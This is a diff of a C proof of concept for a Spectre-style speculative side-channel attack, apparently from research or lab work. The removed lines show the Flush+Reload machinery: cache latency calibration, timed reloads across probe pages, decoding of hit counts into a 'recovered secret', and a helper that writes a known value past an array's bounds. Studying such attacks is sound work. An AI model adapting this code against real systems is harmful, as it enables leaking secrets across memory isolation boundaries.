@@ -53,10 +53,6 @@ uint8_t* array_init(){
     return array;
 }
 
-void otherArray_init(uint32_t size, uint32_t malicious_index, char known_value, uint8_t* prevReallocArray){
-    uint8_t* array = prevReallocArray + size + (malicious_index-1);
-    *array = known_value;
-}
 
 char prev_char = 'A';
 char random_char(){
@@ -87,71 +83,15 @@ void flush_lines(void *start, size_t stride, size_t N) {
     }
 }
 
-void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
-    uint64_t most_hits = 0, scd_most_hits = 0;
-    unsigned char raw_c = '\0', scd_raw_c = '\0';
-    for (size_t i = 1; i < cnt && i < SYMBOL_CNT; i++) {
-        if (most_hits < hits[i]) {
-            scd_most_hits = most_hits;
-            scd_raw_c = raw_c;
-
-            most_hits = hits[i];
-            raw_c = i;
-        }
-
-        // if (hits[i] > 0){
-        //     printf("Character '%c' (ASCII=%#4x) has %3lu hits\n",
-        //            isprint(i) ? i : '?', i, hits[i]);
-        // }
-    }
-
-    *c = isprint(raw_c) ? raw_c : '?';
-    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
-    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3lu); "
-           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n",
-           *c, *c, most_hits, scd_c, scd_raw_c, scd_most_hits);
-}
 
 // ====== The evil attacker code ======
 
-
-uint64_t calibrate_latency() {
-    uint64_t hit = 0, miss = 0, threshold, rep = 1000;
-    uint8_t *data = malloc(8);
-    assert(data); // Lazy "exception" handling
-
-    // Measure cache hit latency
-    _maccess(data);
-    for (uint32_t n = 0; n < rep; n++) {
-        uint64_t start = _timer_start();
-        _maccess(data);
-        hit += _timer_end() - start;
-    }
-    hit /= rep;
-
-    // Measure cache miss latency
-    for (uint32_t n = 0; n < rep; n++) {
-        _mm_clflush(data);
-        uint64_t start = _timer_start();
-        _maccess(data);
-        miss += _timer_end() - start;
-    }
-    miss /= rep;
-
-    threshold = ((2 * miss) + hit) / 3;
-    printf("Avg. hit latency: %" PRIu64 ", Avg. miss latency: %" PRIu64
-           ", Threshold: %" PRIu64 "\n",
-           hit, miss, threshold);
-    free(data);
-    return threshold;
-}
-
 uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
-    // if (new_size <= array_size && new_size >= (array_size / 2) && new_size > 0) {
-    //     *array = realloc(*array, new_size);
-    // }
+    if (new_size <= array_size && new_size >= (array_size / 2) && new_size > 0) {
+        *array = realloc(*array, new_size);
+    }
 
-    *array = realloc(*array, new_size);
+    // *array = realloc(*array, new_size);
 
     index &= array_index_mask_nospec(index, new_size);
     uint8_t secret = (*array)[index];
@@ -177,7 +117,6 @@ void attacker_function() {
     memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
 
 
-    uint64_t threshold = calibrate_latency();
     printf("-----------------------------------------\n");
     uint64_t hits[SYMBOL_CNT] = { 0 };
     char buf[BUF_SIZE] = { '\0' };
@@ -193,11 +132,6 @@ void attacker_function() {
     size_t safe_index = array_size/2; //An in-bound index
     size_t malicious_size = (size_t)(malicious_index+1);
 
-    uint8_t *otherArray = malloc(malicious_size * sizeof(uint8_t));
-    char known_value = random_char();
-    otherArray_init(malicious_size * sizeof(uint8_t), malicious_index, known_value, otherArray);
-    free(otherArray);
-    // printf("Other Array addr: %p\n", otherArray);
 
     for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
         for (size_t r = 0; r < REP; r++) {
@@ -226,30 +160,10 @@ void attacker_function() {
                 // Call the victim function and prevent compiler optimizations
                 _no_opt(victim_function(&array, pages, index, PAGE_SIZE, size));
             }
-
-            for (size_t i = 0; i < SYMBOL_CNT; i++) {
-                // A clever hack to traverse [0, 255] in an unpredictable order
-                // to confuse the prefetcher
-                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
-
-                // The "Reload" part of Flush+Reload
-                // Can be replaced with Prime+Probe
-                uint8_t *ptr = pages + PAGE_SIZE * idx;
-                if (idx != (uint8_t)known_value) {
-                    hits[idx] += (_time_maccess(ptr) <= threshold);
-                }
-            }
-            otherArray_init(malicious_size, malicious_index, known_value, array);
             free(array);
             array = array_init();
-            known_value = random_char();
         }
-
-        // Save the recovered character
-        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
-        memset(hits, 0, sizeof(hits)); // Reset hit counts
     }
-    printf("Recovered secret: \"%s\"\n", buf);
     munmap(pages, PAGE_SIZE * SYMBOL_CNT);
     free(array);
     free(secret);
